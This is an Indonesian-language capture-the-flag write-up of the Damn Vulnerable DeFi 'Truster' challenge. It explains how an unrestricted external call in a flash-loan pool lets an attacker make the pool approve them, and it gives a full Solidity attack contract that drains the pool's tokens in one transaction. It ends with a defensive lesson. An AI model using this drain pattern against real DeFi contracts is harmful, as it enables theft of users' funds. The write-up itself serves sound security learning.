# Damn Vulnerable DeFi — Truster (Writeup)

> Status: **SOLVED** ✅ (`[PASS] test_truster`)
> Goal: kuras 1.000.000 token dari `TrusterLenderPool` ke `recovery`, dalam **1 transaksi**.

---

## 1. Kontrak target

`TrusterLenderPool` cuma punya 1 fungsi:

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external nonReentrant returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);       // (2) pinjemin token ke borrower
    target.functionCall(data);              // (3) panggil target.data  <-- BAHAYA

    if (token.balanceOf(address(this)) < balanceBefore) revert RepayFailed();  // (4) cek balik
    return true;
}
```

---

## 2. Bug-nya

Baris (3): `target.functionCall(data)` — pool bakal manggil **alamat apapun** (`target`) dengan **data apapun** (`data`) yang kita kasih.

Dan yang paling penting: waktu panggilan itu jalan, **`msg.sender`-nya adalah POOL.**

Artinya kita bisa nyuruh pool "ngomong atas nama dirinya sendiri". Contoh: kita suruh pool manggil `token.approve(kita, 1_000_000)` → **pool meng-approve kita buat ngabisin token pool-nya sendiri.** 😈

Karena `amount` juga bebas, kita pinjam **0** aja (gak butuh token beneran) → cek repay (4) otomatis lolos.

---

## 3. Alur serangan

1. Bikin `data = approve(attacker, 1_000_000)`.
2. `flashLoan(0, borrower, token, data)` → pool jalanin `token.approve(attacker, 1M)` dengan `msg.sender = pool`.
3. Sekarang attacker punya allowance 1M dari pool → `transferFrom(pool, recovery, 1M)`.
4. Semua kejadian di **constructor** attacker = 1 deploy = 1 transaksi (lolos syarat `nonce == 1`).

---

## 4. Kode solusi

```solidity
function test_truster() public checkSolvedByPlayer {
    attackTruster attack = new attackTruster(
        address(pool),
        address(token),
        address(recovery)
    );
}

interface ITruster {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external;
}
interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract attackTruster {
    address pool;
    address token;
    address recovery;
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address _pool, address _token, address _recovery) {
        pool = _pool;
        token = _token;
        recovery = _recovery;

        // 1. resep: approve attacker buat ngabisin token pool
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            TOKENS_IN_POOL
        );

        // 2. pinjam 0, tapi paksa pool jalanin approve (msg.sender = pool)
        ITruster(pool).flashLoan(0, address(recovery), token, data);

        // 3. tarik token pool langsung ke recovery
        IERC20(token).transferFrom(pool, address(recovery), TOKENS_IN_POOL);
    }
}
```

---

## 5. Konsep yang dipelajari

- **Arbitrary external call**: `target.functionCall(data)` dengan target+data dari user = super berbahaya, karena panggilan itu pakai identitas kontrak (`msg.sender = pool`).
- **`abi.encodeWithSignature`**: bikin calldata `approve(address,uint256)` buat diselipin.
- **`approve` / `transferFrom`**: pool approve attacker → attacker `transferFrom` token pool.
- **Semua di constructor = 1 tx**: buat lolos syarat `vm.getNonce(player) == 1`.

## 6. Pelajaran keamanan

Jangan pernah bikin kontrak manggil alamat + data sembarang dari user. Kalau perlu callback, batasi ke interface/target tepercaya, dan jangan biarkan panggilan itu bisa mengubah izin/aset kontrak itu sendiri (di sini: `approve` atas nama pool). Bug klasik "confused deputy".
